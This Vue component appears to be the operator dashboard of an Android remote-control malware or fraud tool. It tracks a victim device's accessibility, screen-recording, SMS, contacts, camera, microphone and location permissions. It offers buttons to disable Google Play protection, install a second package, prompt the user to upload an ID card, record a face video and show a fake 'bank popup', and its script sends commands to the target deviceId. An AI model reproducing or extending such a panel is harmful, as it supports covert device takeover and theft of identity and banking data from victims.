<template>
  <div class="page-container">
    <el-row class="ip-info">
      <el-col :span="24">
        <el-card>
          <span
            >{{ $t("当前IP") }}: <span class="highlight">1.1.1.1</span></span
          >
          <span class="p-l-20"
            >{{ $t("代理信息") }}:
            <span class="highlight">127.0.0.1:0000</span></span
          >
        </el-card>
      </el-col>
    </el-row>

    <el-row class="packages">
      <el-col :span="12" class="package-box">
        <el-card>
          <div slot="header">
            {{ $t("A包")
            }}<el-tag class="fixed-width-tag" type="success">{{
              $t("在线")
            }}</el-tag>
          </div>
          <el-row>
            <el-col :span="12">
              <div class="permission-item">
                <span>{{ $t("安装其他包权限") }}:</span>
                <el-tag class="fixed-width-tag" type="info" size="small">{{
                  $t("未授权")
                }}</el-tag>
                <el-tag class="fixed-width-tag" effect="dark" type="warning">{{
                  $t("去打开")
                }}</el-tag>
              </div>
              <div class="permission-item">
                <span>{{ $t("无障碍权限") }}:</span>
                <el-tag class="fixed-width-tag" type="success" size="small">{{
                  $t("已授权")
                }}</el-tag>
              </div>
              <div class="permission-item">
                <span>{{ $t("录屏权限") }}:</span>
                <el-tag class="fixed-width-tag" type="success" size="small">{{
                  $t("已授权")
                }}</el-tag>
              </div>
              <div class="permission-item">
                <span>{{ $t("谷歌保护权限") }}:</span>
                <el-tag class="fixed-width-tag" type="info" size="small">{{
                  $t("未授权")
                }}</el-tag>
                <el-tag class="fixed-width-tag" effect="dark" type="warning">{{
                  $t("去关闭")
                }}</el-tag>
              </div>
            </el-col>

            <el-col :span="12">
              <div class="permission-item">
                <span>{{ $t("相册权限") }}:</span>
                <el-tag class="fixed-width-tag" type="info" size="small">{{
                  $t("未授权")
                }}</el-tag>
              </div>
              <div class="permission-item">
                <span>{{ $t("发送短信权限") }}:</span>
                <el-tag class="fixed-width-tag" type="info" size="small">{{
                  $t("未授权")
                }}</el-tag>
              </div>
              <div class="permission-item">
                <span>{{ $t("摄像头权限") }}:</span>
                <el-tag class="fixed-width-tag" type="info" size="small">{{
                  $t("未授权")
                }}</el-tag>
              </div>
            </el-col>
          </el-row>
        </el-card>
      </el-col>

      <el-col :span="12" class="package-box">
        <el-card>
          <div slot="header">
            {{ $t("B包") }}
            <el-tag class="fixed-width-tag" type="danger" size="small">{{
              $t("离线")
            }}</el-tag>
            <el-tag class="fixed-width-tag m-l-10" effect="dark" type="warning">
              {{ $t("下载包") }}</el-tag
            >
          </div>
          <el-row>
            <el-col :span="12">
              <div class="permission-item">
                <span> {{ $t("是否已安装") }}:</span>
                <el-tag class="fixed-width-tag" type="warning" size="small">
                  {{ $t("未安装") }}</el-tag
                >
                <el-tag class="fixed-width-tag" effect="dark" type="warning">
                  {{ $t("去安装") }}</el-tag
                >
              </div>
              <div class="permission-item">
                <span> {{ $t("短信权限") }}:</span>
                <el-tag class="fixed-width-tag" type="info" size="small">
                  {{ $t("未授权") }}</el-tag
                >
                <el-tag class="fixed-width-tag" effect="dark" type="warning">
                  {{ $t("去授权") }}</el-tag
                >
              </div>
              <div class="permission-item">
                <span> {{ $t("通讯录权限") }}:</span>
                <el-tag class="fixed-width-tag" type="info" size="small">{{
                  $t("未授权")
                }}</el-tag>
                <el-tag class="fixed-width-tag" effect="dark" type="warning">{{
                  $t("去授权")
                }}</el-tag>
              </div>
            </el-col>

            <el-col :span="12">
              <div class="permission-item">
                <span>{{ $t("存储权限") }}:</span>
                <el-tag class="fixed-width-tag" type="info" size="small">{{
                  $t("未授权")
                }}</el-tag>
                <el-tag class="fixed-width-tag" effect="dark" type="warning">{{
                  $t("去授权")
                }}</el-tag>
              </div>
              <div class="permission-item">
                <span>{{ $t("位置信息权限") }}:</span>
                <el-tag class="fixed-width-tag" type="info" size="small">{{
                  $t("未授权")
                }}</el-tag>
                <el-tag class="fixed-width-tag" effect="dark" type="warning">{{
                  $t("去授权")
                }}</el-tag>
              </div>
              <div class="permission-item">
                <span>{{ $t("麦克风权限") }}:</span>
                <el-tag class="fixed-width-tag" type="info" size="small">{{
                  $t("未授权")
                }}</el-tag>
                <el-tag class="fixed-width-tag" effect="dark" type="warning">{{
                  $t("去授权")
                }}</el-tag>
              </div>
            </el-col>
          </el-row>
        </el-card>
      </el-col>
    </el-row>

    <el-card>
      <el-row class="bottom-actions">
        <el-col :span="24">
          <el-button icon="Picture" size="mini">{{
            $t("获取相册权限")
          }}</el-button>
          <el-button icon="CreditCard" size="mini">{{
            $t("引导用户上传身份证窗口")
          }}</el-button>
          <el-button icon="Avatar" size="mini">{{
            $t("录制人脸视频")
          }}</el-button>

          <el-button icon="Position" size="mini">{{
            $t("获取位置权限")
          }}</el-button>
          <el-button
            icon="Setting"
            size="mini"
            @click="setInstructions(68, '')"
            >{{ $t("进入设置页面") }}</el-button
          >
        </el-col>
      </el-row>
      <el-row class="bottom-actions">
        <el-col :span="24">
          <el-button type="primary" icon="View" size="mini">{{
            $t("相册查看")
          }}</el-button>
          <el-button type="primary" icon="View" size="mini">{{
            $t("身份证查看")
          }}</el-button>
          <el-button type="primary" icon="View" size="mini">{{
            $t("银行弹窗")
          }}</el-button>
        </el-col>
      </el-row>
    </el-card>

    <el-row class="footer-info">
      <el-col :span="24">
        <el-card>
          <div class="u-flex u-flex-items-center">
            <el-icon><RefreshRight /></el-icon>
            <p class="p-l-10">{{ $t("人脸视频") }}: {{ $t("无") }}</p>
          </div>
        </el-card>
      </el-col>
    </el-row>
  </div>
</template>

<script setup>
import phoneStore from "@/store/modules/controlPhone";
import { reactive } from "vue";
import { nanoid } from "nanoid";
import Cookies from "js-cookie";
import { getUserId } from "@/utils/auth";
import { useI18n } from "vue-i18n";

import { ElMessage } from "element-plus";
const { t } = useI18n();
const route = useRoute();

let routeQuery = JSON.parse(route.query.command);
const baseParams = {
  terminal: 1,
  userId: routeQuery.deviceId,
  adminId: `${getUserId()}_${Cookies.get("UUID")}`,
  reqId: nanoid(),
};
const setInstructions = (packType, text) => {
  // ElMessage({
  //   message: t(
  //     "要使用该功能，请先确认对方的手机已开通【允许后台弹出窗口】的权限"
  //   ),
  //   type: "warning",
  // });

  phoneStore().setDynamicParams({
    // terminal: 1, //终端类型1为管理终端  必传
    // packType, //必传
    // userId: route.query.deviceId, //发给哪个终端
    // // userId_uid: getUserId(),
    // adminId: `${getUserId()}_${Cookies.get("UUID")}`,
    // reqId: nanoid(), //必传
    ...baseParams,
    packType,
    // strPack: text,
    // int32Pack: 3, //1.全局事件，需传参
  });
};
</script>

<style scoped>
.page-container {
  padding: 20px;
}

.ip-info {
  margin-bottom: 20px;
  font-size: 12px;
}

.highlight {
  font-weight: bold;
  color: #409eff;
}

.packages {
  margin-bottom: 20px;
}

.package-box {
  padding: 10px;
}

.permission-item {
  display: flex;
  align-items: center;
  margin-bottom: 10px;
}

.permission-item span {
  flex: 1;
  font-size: 12px;
}

.fixed-width-tag {
  /* width: 50px; */
  text-align: center;
}

.permission-item .el-tag {
  margin-right: 10px;
  font-size: 9px;
}

.permission-item .el-button {
  margin-left: 10px;
  font-size: 12px;
}

.bottom-actions {
  /* text-align: center; */
}

.bottom-actions .el-button {
  margin: 10px;
  font-size: 12px;
}

.footer-info {
  margin-top: 20px;
  text-align: left;
  font-size: 12px;
}
</style>
